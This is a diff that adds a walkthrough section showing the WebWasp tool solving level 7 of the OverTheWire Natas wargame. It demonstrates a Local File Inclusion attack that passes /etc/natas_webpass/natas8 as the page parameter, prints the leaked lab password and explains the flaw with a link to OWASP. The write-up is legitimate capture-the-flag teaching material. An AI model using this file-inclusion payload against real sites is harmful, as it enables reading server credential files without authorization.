@@ -17,7 +17,8 @@ The intent for this walkthrough is to demonstrate WebWasp's abilities in a "real
 - [Level 4](#level-4) (The referer header)
 - [Level 5](#level-5) (Cookies! 🍪)
 - [Level 6](#level-6) (Our first POST request)
-- [Level 7](#level-7) 
+- [Level 7](#level-7) (Local File Inclusion Exploit)
+- [Level 8](#level-8)
 
 ## Level 0
 
@@ -986,6 +987,103 @@ And there we go! We provided the right value for the `secret` field of the POST 
 Let's store it in `pass7` and continue.
 
 ## Level 7
+
+Let's clean up a bit from last level:
+
+```
+> params clear
+[🐝] Stored parameters cleared
+```
+
+Update the auth fields, and get the source for level 7:
+
+```HTML
+> response show -t
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas7</h1>
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+</body>
+</html>
+```
+
+A couple of new things on this page of note. Firstly we have those two links that are using the `page` parameter.
+
+Secondly there's a comment telling us that the password for the next level is stored in the location `/etc/natas_webpass/natas8` on the server.
+
+So how do we get to it?
+
+The answer lies in a security vulnerability that the designer of this site has not considered. The `index.php` page takes a parameter called `page`. In the above links, the pages that are passed into this parameter are `home` and `about` respectively.
+
+But we can custom-curate a parameter to pass to `index.php` that may take advantage of some lackadaisical security practices.
+
+We want to pass the location of the password file as the `page` parameter to `index.php`, and maybe it will deliver us that page, even though the creator of the site probably didn't intend that.
+
+First, let's set our parameter:
+
+```
+> params add "page" "/etc/natas_webpass/natas8"
+[🐝] Added param:
+   'page' : '/etc/natas_webpass/natas8'
+```
+
+Now let's perform a get request against `index.php`:
+
+```
+> get http://natas7.natas.labs.overthewire.org/index.php                           
+[🐝] Sending GET request to http://natas7.natas.labs.overthewire.org/index.php?page=%2Fetc%2Fnatas_webpass%2Fnatas8...
+[🐝] GET request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+
+We can see from the feedback here that WebWasp automatically formatted our parameter for us and tacked it onto the URL. Unless we specify the `--no-params` flag like we did last level, all parameters will be automatically tagged onto our get requests like we see here.
+
+And looking at the response:
+
+```HTML
+> resp show -t
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas7</h1>
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+</body>
+</html>
+```
+
+And there we go! It dumped the contents of `/etc/natas_webpass/natas8` for us!
+
+The vulnerability we just exploited was called _Local File Inclusion_, and is an extremely common exploit that many sites fall victim to.
+
+If you're curious, you can check out OWASP's entry pertaining to this exploit at
+
+> https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+
+Let's save that password into `pass8` and move on!
+
+## Level 8
 
 ---
 
